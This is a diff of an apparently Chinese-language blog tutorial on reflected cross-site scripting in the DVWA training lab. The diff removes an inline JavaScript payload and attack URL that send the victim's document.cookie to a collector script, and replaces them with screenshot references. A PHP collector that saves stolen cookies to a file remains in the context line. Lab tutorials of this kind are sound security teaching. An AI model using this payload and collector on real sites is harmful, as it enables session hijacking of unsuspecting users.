@@ -108,10 +108,10 @@ $cookie = $_GET[ 'cookie'];file_put_contents('cookie.txt',$cookie);
 ?>
 
 <p>构造攻击js</p>
-<script>document.location='http://127.0.0.1/cookie.php?cookie='+document.cookie;</script>
-
+<p><img src="D:\blog范本\构造攻击js.PNG" alt="构造攻击js"></p>
 <p>构造并发送攻击url</p>
-<p>http:// 10.240.138.212/DVWA-1.9/vulnerabilities/xss_r/?name=<script>document.location='http ://127.0.0.1/cook ie.php?cookie='+document.cookie;</script>同时需要对参数进行url编码</p>
+<p><img src="D:\blog范本\url攻击.PNG" alt="url攻击"></p>
+<p>同时需要对参数进行url编码</p>
 <p>获得cookie</p>
 <p>http:// 127.0.0.1/cookie.txt</p>
 <p>内容：</p>
